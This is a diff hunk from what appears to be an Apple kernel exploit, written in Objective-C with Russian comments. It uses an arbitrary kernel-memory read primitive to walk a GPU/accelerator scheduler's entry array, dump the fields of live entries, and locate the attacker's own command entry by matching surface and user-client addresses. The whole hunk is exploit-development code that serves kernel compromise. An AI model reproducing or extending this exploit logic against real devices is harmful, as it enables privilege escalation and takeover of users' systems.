@@ -6666,15 +6666,35 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (kpLooksLikeKernelPointer(pipeVA) && surfVA) {
             uint64_t schVA = kp_untag_ptr(early_kread64(pipeVA + 0xb8));
             uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA",
+            kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA / [ep+0x48]==ucVA",
                       (unsigned long long)schVA, (unsigned long long)earr]);
             if (kpLooksLikeKernelPointer(earr)) {
-                for (uint32_t i = 0; i < 384 && !cmdVA; i++) {
+                // 1.9.171: диагностика — дамп первых 8 живых записей с полями
+                // layout'а (видно, чему равны surface/UC поля на самом деле)
+                int shown = 0, live = 0;
+                for (uint32_t i = 0; i < 384 && shown < 8; i++) {
+                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
+                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
+                    live++;
+                    if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
+                    uint64_t f48 = kp_untag_ptr(early_kread64(ep + 0x48));
+                    uint64_t f4c8 = kp_untag_ptr(early_kread64(ep + 0x4c8));
+                    uint64_t f788 = kp_untag_ptr(early_kread64(ep + 0x788));
+                    uint64_t f790 = kp_untag_ptr(early_kread64(ep + 0x790));
+                    kpNote(r, [NSString stringWithFormat:@"    запись[%u]=%#llx: [+0x48]=%#llx [+0x4c8]=%#llx [+0x788]=%#llx [+0x790]=%#llx%@",
+                              i, (unsigned long long)ep, (unsigned long long)f48,
+                              (unsigned long long)f4c8, (unsigned long long)f788, (unsigned long long)f790,
+                              f788 == surfVA ? @" ← НАША (surfVA)!" : (f48 == ucVA ? @" ← НАША (ucVA)!" : @"")]);
+                    shown++;
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P2] живых записей в первых 384: %d", live]);
+                for (uint32_t i = 0; i < 2048 && !cmdVA; i++) {
                     uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
                     if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
                     if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
-                    if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись [%u]=%#llx ([+0x788]=surfVA ✓)", i, (unsigned long long)ep]);
+                    if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA &&
+                        kp_untag_ptr(early_kread64(ep + 0x48)) != ucVA) continue;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись [%u]=%#llx ✓", i, (unsigned long long)ep]);
                     uint64_t cand = kp_untag_ptr(early_kread64(ep + 0x790));
                     if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
                         uint64_t cvt = kp_untag_ptr(early_kread64(cand));
